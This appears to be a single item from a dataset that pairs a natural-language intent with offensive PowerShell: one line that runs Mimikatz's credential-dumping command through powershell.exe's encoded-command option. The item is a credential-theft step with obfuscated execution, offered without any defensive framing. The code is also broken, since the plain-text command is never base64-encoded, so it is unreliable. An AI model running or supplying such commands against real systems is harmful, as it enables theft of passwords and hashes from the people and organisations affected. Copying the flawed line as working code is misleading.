# Natural language intent:
# Defines a Mimikatz command and executes it using encoded PowerShell.

$code = 'Invoke-Mimikatz -DumpCreds'; powershell.exe -encodedcommand $code
